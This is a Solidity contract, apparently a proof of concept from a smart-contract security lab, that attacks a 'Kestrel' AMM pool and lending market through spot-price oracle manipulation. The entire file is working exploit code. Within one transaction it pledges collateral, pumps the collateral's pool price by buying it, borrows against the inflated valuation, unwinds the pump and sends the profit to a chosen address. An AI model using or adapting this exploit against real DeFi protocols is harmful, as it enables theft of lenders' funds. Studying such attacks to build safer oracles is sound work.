// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { KestrelPool } from "kestrel/KestrelPool.sol";
import { KestrelLending } from "kestrel/KestrelLending.sol";

/// @notice SC03 attacker: in ONE transaction it pledges collateral, pumps the collateral's AMM
///         spot price by buying it with the debt token, borrows against the inflated valuation,
///         and sells the bought collateral back to unwind the pump.
contract SpotOracleAttacker {
    /// @notice Target pool (collateral = token0, debt = token1).
    KestrelPool public immutable pool;
    /// @notice Target lending market.
    KestrelLending public immutable lending;

    /// @param _pool Target pool.
    /// @param _lending Target lending market.
    constructor(KestrelPool _pool, KestrelLending _lending) {
        pool = _pool;
        lending = _lending;
    }

    /// @notice Run the attack with tokens this contract holds and forward everything to `to`.
    /// @param pledge Collateral tokens to pledge.
    /// @param pump Debt tokens sold into the pool to pump the collateral price.
    /// @param borrowAmount Debt tokens to borrow at the pumped valuation.
    /// @param to Profit recipient.
    function attack(uint256 pledge, uint256 pump, uint256 borrowAmount, address to) external {
        IERC20 col = pool.token0();
        IERC20 dbt = pool.token1();
        col.approve(address(lending), pledge);
        lending.depositCollateral(pledge);

        dbt.approve(address(pool), pump);
        uint256 bought = pool.swap(address(dbt), pump, 0, address(this));
        lending.borrow(borrowAmount);

        col.approve(address(pool), bought);
        pool.swap(address(col), bought, 0, address(this));

        col.transfer(to, col.balanceOf(address(this)));
        dbt.transfer(to, dbt.balanceOf(address(this)));
    }
}
